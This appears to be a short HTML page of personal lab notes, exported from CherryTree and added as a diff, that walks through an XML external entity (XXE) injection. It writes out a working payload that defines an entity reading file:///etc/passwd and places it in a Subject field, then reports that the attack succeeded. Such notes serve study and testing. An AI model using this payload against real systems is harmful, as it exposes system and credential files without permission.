@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>XXE Example</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>XXE Example</h1><br/><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability</a><br />^Payload all the things has THE list of xxe payloads<br /><br />I am restricted to only calling Author, Subject, and Content<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;Yeet&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt; <br /><br /><br />So I try the classic oneliner and set the variable &amp;test; to print out /etc/passwd<br />&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;<br /><br />the whole script looks like this<br />&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;<br />&lt;yee&gt;<br />    &lt;Author&gt;Squid&lt;/Author&gt;<br />    &lt;Subject&gt;&amp;test;&lt;/Subject&gt;<br />    &lt;Content&gt;cannon&lt;/Content&gt;<br />&lt;/yee&gt;    <br /><br /><br />success! we called &amp;test; with subject and it printed out the outcome of the variable<br /></div></body></html>
